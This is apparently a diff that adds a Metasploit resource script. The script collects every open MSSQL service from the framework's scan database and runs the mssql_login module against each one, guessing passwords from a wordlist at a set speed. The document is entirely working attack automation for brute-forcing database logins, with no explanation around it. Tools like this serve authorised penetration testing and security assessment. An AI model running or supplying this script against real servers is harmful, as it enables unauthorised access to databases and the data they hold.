@@ -1,0 +1,33 @@
+<ruby>
+
+hosts = []
+
+begin
+	framework.db.services.each do |service|
+		if ( service.name =~ /mssql/i and service.state == 'open' and service.proto == 'tcp')
+			hosts << {'ip' => service.host.address, 'port' => service.port}
+		end
+	end
+rescue ActiveRecord::ConnectionNotEstablished
+puts "DB not connected..."
+# Uncomment if you want auto-reconnect and retry (on really large scans the db connector can time out)
+# self.run_single('db_connect <creds>')
+# puts "trying again..."
+# retry
+end
+
+self.run_single("use auxiliary/scanner/mssql/mssql_login")
+self.run_single('set PASS_FILE /opt/framework/data/wordlists/mssql.txt')
+#self.run_single('set STOP_ON_SUCCESS TRUE')
+hosts.each do |rhost|
+
+	self.run_single("set RHOSTS #{rhost['ip']}")
+	self.run_single("set RPORT #{rhost['port']}")
+	self.run_single('set BRUTEFORCE_SPEED 5')
+	self.run_single('set BLANK_PASSWORDS false')
+	self.run_single('set USER_AS_PASS false')
+	self.run_single('run')
+	sleep 1
+end
+</ruby>
+
